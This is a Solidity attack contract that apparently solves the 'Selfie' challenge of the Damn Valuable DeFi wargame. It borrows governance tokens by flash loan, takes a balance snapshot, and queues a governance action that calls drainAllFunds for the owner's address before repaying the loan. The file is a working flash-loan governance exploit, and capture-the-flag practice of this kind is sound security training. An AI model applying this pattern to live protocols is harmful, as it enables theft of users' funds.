// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract AttackSelfie {
    DamnValuableTokenSnapshot governToken;
    SelfiePool pool;
    address owner;

    constructor(
        address poolAddy,
        address governTokenAddy,
        address _owner
        
    ) {
        pool = SelfiePool(poolAddy);
        governToken = DamnValuableTokenSnapshot(governTokenAddy);
        owner = _owner;
    }

    function attack(uint256 amount) public {
        // Initiate flash loan and trigger receiveTokens()
        pool.flashLoan(amount);
    }

    function receiveTokens(address token, uint256 amount) public {
        // Take balance snapshot
        DamnValuableTokenSnapshot(token).snapshot();
        // Queue governance action
        pool.governance().queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", owner),
            0 
        );
        // Return flash loan
        DamnValuableTokenSnapshot(token).transfer(address(pool), amount);
    }
}
